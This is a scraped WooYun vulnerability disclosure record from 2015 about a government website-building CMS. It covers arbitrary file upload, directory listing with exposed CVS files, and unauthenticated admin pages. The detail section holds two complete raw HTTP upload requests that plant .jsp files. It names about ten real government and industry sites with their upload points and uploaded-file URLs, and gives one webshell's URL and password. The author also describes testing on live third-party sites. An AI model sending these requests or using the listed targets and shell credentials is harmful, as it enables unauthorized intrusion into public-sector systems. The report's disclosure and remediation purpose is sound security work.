{"id": 35268, "wybug_id": "wooyun-2015-0104337", "wybug_title": "某政府建站系统通用型漏洞打包", "wybug_corp": "宁夏电通物联网技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-30 17:42", "wybug_open_date": "2015-07-02 15:36", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： 1#任意文件上传2#目录浏览+SVN/CVS泄漏3#大量管理页面未授权访问 详细说明：  首先这个厂商有前人提过的一个漏洞， WooYun: 某通用型政府建站系统由一个越权页面+恶意修改导致网站瞬间出错 ，文中提到存在越权的页面为http://www.cn-dt.com.cn/cms/template/templateList.jsp其实不止是该页面，通过系统的目录浏览，我们能发现更多的问题以官网为例2#目录浏览（非所有案例都存在，大部分）http://www.cn-dt.com.cn//common/http://www.cn-dt.com.cn/cms/http://www.cn-dt.com.cn/extfile/http://www.cn-dt.com.cn/conf/http://www.cn-dt.com.cn/stat/3#大量管理页面未授权访问也就是说只要你猜得到目录名，目录底下的所有文件你都可以尝试是否存在越权访问我举几个明显的例子（非所有案例都存在，大部分）http://www.cn-dt.com.cn/stat/leftbar.jsp\n\n\n\nhttp://www.cn-dt.com.cn/conf/ConfInputList.jsp#\n\nhttp://www.cn-dt.com.cn/conf/leftbar.jsp\n\nhttp://www.cn-dt.com.cn/conf/mqueryDetail.jsp?link=cms_td_info_history\n\nhttp://www.cn-dt.com.cn/common/acc/leftbar.jsp\n\n其实说白了就是根据 leftbar.jsp里的导航地址与主体地址一个个去尝试\n\n1#任意文件上传在该系统中我发现了CVS信息，在浏览http://www.cn-dt.com.cn/common/sweditor/时，我发现目录没有出来，我就http://www.cn-dt.com.cn/common/sweditor/CVS/Entries然后我就发现了这个\n\nhttp://www.cn-dt.com.cn/common/sweditor/ewebeditor.htm\n\n一直不懂为什么高版本的ie打不开上传窗口.....换ie6\n\n打开后和我想的完全不一样啊。目前看来是官网做了限制，我们试试在非官网上获取到的上传点http://jsgl.nxsl.gov.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=\n\n抓包修改文件后缀之后，得到POC\n\n\nPOST http://替换我/common/sweditor/jsp/savefile.jsp?action=save&type=image&style=full&language=zh-cn&cusdir= HTTP/1.0Accept: */*Referer: Accept-Language: zh-cnContent-Type: multipart/form-data; boundary=---------------------------7df25e29e022aUA-CPU: x86Pragma: no-cacheUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) ; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) (Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: 替换我Content-Length: 361Connection: Keep-AliveCookie: -----------------------------7df25e29e022aContent-Disposition: form-data; name=\"uploadfile\"; filename=\"C:\\Documents and Settings\\33.jsp\"Content-Type: image/pjpegwooyun test\t\t-----------------------------7df25e29e022aContent-Disposition: form-data; name=\"originalfile\"C:\\Documents and Settings\\33.jpg-----------------------------7df25e29e022a--\n\n\n\n\nhttp://www.cn-dt.com.cn/extfile/20150327/2015032710354433.jsp\n\n上传个一句话http://www.cn-dt.com.cn:80/extfile/20150327/2015032710373033.jsp\n\n为了不引起厂商滴警觉，我把jsp删除了~上传直接用poc更快以下几个案例供复现宁夏建筑业信用网http://61.133.208.18:8085/CVS/http://61.133.208.18:8085/cms/http://61.133.208.18:8085/common/toHtmlEdit.do?fld=icontent&mode=&id=\n\n一句话地址http://61.133.208.18:8085/extfile/20150327/2015032710593833.jsp密码woo11yun\n\n在测试这个站的时候，我又发现了一处上传点，但该点官网已做了处理，不明白为何修复的补丁没有全部下发（该上传点少数站有效）http://*/common/bas/uploadfile.jsp?mode=start\n\n\n\n抓包，修改上传后的文件名newfilename，\nPOST http://修改我/common/uploadFile.do HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df175e2030cAccept-Encoding: gzip, deflateHost: 修改我Content-Length: 403Connection: Keep-AlivePragma: no-cacheCookie: 修改我，不要求登录，在访问网站的时候都会生成一个，直接把那个复制过来-----------------------------7df175e2030cContent-Disposition: form-data; name=\"cfile\"; filename=\"121.txt\"Content-Type: text/plainwooyun test-----------------------------7df175e2030cContent-Disposition: form-data; name=\"newfilename\"wooyun.jsp-----------------------------7df175e2030cContent-Disposition: form-data; name=\"prename\"121.txt-----------------------------7df175e2030c--\n\n\nhttp://61.133.208.18:8085/extfile/20150327/2010361252-wooyun.jsp\n\n还有以下案例：http://jsgl.nxsl.gov.cn/CVS/http://jsgl.nxsl.gov.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=利用poc\n\nhttp://jsgl.nxsl.gov.cn/extfile/20150327/2015032711234333.jsp\n\nhttp://www.nxzj.org.cn/commonhttp://www.nxzj.org.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=\n\nhttp://www.nxzj.org.cn/extfile/20150327/2015032711332933.jsp\n\nhttp://12366.nxds.gov.cn/commonhttp://12366.nxds.gov.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=http://12366.nxds.gov.cn:80/common/sweditor/uploadfile/2015032711330133.jsp\n\nhttp://www.nxnc.gov.cn/common/CVS/Entrieshttp://www.nxnc.gov.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=\n\nhttp://www.nxnc.gov.cn:80/common/sweditor/uploadfile/2015032711473333.jsphttp://www.nxgczl.com.cn/common/CVS/Entrieshttp://www.nxgczl.com.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=http://www.nxgczl.com.cn/common/sweditor/uploadfile/2015032710452933.jsp\n\nhttp://www.nxzb.com.cn//common/CVS/Entrieshttp://www.nxzb.com.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=http://www.nxzb.com.cn:80/extfile/20150327/2015032710501333.jsp\n\nhttp://gxj.yinchuan.gov.cn/common/CVS/Entrieshttp://gxj.yinchuan.gov.cn//common/toHtmlEdit.do?fld=icontent&mode=&id=\n\nhttp://gxj.yinchuan.gov.cn:80/extfile/20150328/2015032812105733.jsp\n\nhttp://dfz.yinchuan.gov.cn/common/CVS/Entrieshttp://dfz.yinchuan.gov.cn/common/toHtmlEdit.do?fld=icontent&mode=&id=\n\nhttp://dfz.yinchuan.gov.cn:80/extfile/20150328/2015032812163733.jsp   漏洞证明：  http://dfz.yinchuan.gov.cn:80/extfile/20150328/2015032812163733.jsphttp://gxj.yinchuan.gov.cn:80/extfile/20150328/2015032812105733.jsphttp://www.nxzb.com.cn:80/extfile/20150327/2015032710501333.jsphttp://www.nxgczl.com.cn/common/sweditor/uploadfile/2015032710452933.jsphttp://www.nxnc.gov.cn:80/common/sweditor/uploadfile/2015032711473333.jsphttp://12366.nxds.gov.cn:80/common/sweditor/uploadfile/2015032711330133.jsp\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  删除不正确的SVN、CVS配置控制权限上传点过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-04-03 15:35 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给宁夏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}